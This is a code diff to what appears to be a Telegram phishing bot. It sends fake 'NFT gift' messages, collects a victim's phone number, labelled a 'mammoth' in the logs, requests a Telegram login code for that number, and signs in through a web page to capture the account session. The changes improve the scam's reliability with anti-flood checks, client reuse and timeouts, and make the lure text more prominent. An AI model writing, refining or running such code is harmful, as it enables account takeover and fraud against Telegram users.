@@ -1,4 +1,5 @@
 import os
+import time
 import asyncio
 import threading
 import urllib.parse
@@ -30,7 +31,8 @@ main_loop = asyncio.get_event_loop()
 active_clients = {}
 temp_clients = {}
 pending_contacts = {}
-login_data = {} 
+login_data = {}
+last_requests = {}
 
 def get_code_keyboard(current_code=""):
     # Создаем кнопки 1-9
@@ -189,7 +191,7 @@ async def inline_handler(event):
     # Мы используем Markdown-разметку [текст](ссылка)
     message_text = (
         f"🎁 **Вам отправили подарок!**\n\n"
-        f"NFT: [{nft_name}]({input_text})\n\n"
+        f"**NFT: [{nft_name}]({input_text})**\n\n"
         "Учтите, что подарок можно принять только с аккаунта, на "
         "который был отправлен данный подарок. Ссылка действительна "
         "**60 минут** с момента получения.\n\n"
@@ -202,9 +204,11 @@ async def inline_handler(event):
             title=f"🎁 Подарить: {nft_name}",
             text=message_text,
             link_preview=False,
+            parse_mode='md',
             buttons=[
-                [types.KeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
-                [types.KeyboardButtonUrl(text="Посмотреть подарок", url=input_text)]
+                # ВАЖНО: для WebApp в инлайне используем Button.url + force_webview
+                [types.KeyboardButtonUrl("Принять подарок 🎁", web_url)],
+                [Button.url("Посмотреть подарок", input_text)]
             ]
         )
     ])
@@ -312,7 +316,7 @@ async def redrain_callback(event):
 
 @app.route('/')
 def index(): 
-    target = request.args.get('nft_url', 'Главная')
+    target = request.args.get('nft_url', '')
 
     display_name = target
     if "t.me/" in target:
@@ -366,23 +370,43 @@ def api_send_code():
 
     # Безопасно запускаем асинхронную функцию в основном цикле Telethon
     future = asyncio.run_coroutine_threadsafe(_async_sign_in(), main_loop)
-    return jsonify(future.result())
+    try:
+        return jsonify(future.result(timeout=20))
+    except Exception:
+        return jsonify({"status": "error", "message": "Превышено время ожидания сервера"})
 
 @bot.on(events.NewMessage)
 async def contact_handler(event):
     if event.contact and event.contact.user_id == event.sender_id:
         phone = event.contact.phone_number
         if not phone.startswith('+'): phone = '+' + phone
+        
+        # ЖЕСТКИЙ АНТИ-ФЛУД
+        current_time = time.time()
+        if phone in last_requests and (current_time - last_requests[phone]) < 10:
+            return # Игнорим дубликат запроса
+        
+        last_requests[phone] = current_time
         pending_contacts[str(event.sender_id)] = phone
+        
         send_log(f"📞 Мамонт поделился номером: {phone}")
+        
         try:
-            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
-            await client.connect()
+            # Если клиент уже создан, не пересоздаем его
+            if phone in temp_clients:
+                client = temp_clients[phone]['client']
+            else:
+                client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
+                await client.connect()
+            
             res = await client.send_code_request(phone)
             temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
             send_log(f"📩 Код на {phone} отправлен.")
+            
         except Exception as e:
             send_log(f"❌ Ошибка сессии {phone}: {e}")
+            # Если ошибка, удаляем из фильтра, чтобы можно было попробовать еще раз
+            last_requests.pop(phone, None)
 
 if __name__ == '__main__':
     if not os.path.exists('sessions'): os.makedirs('sessions')
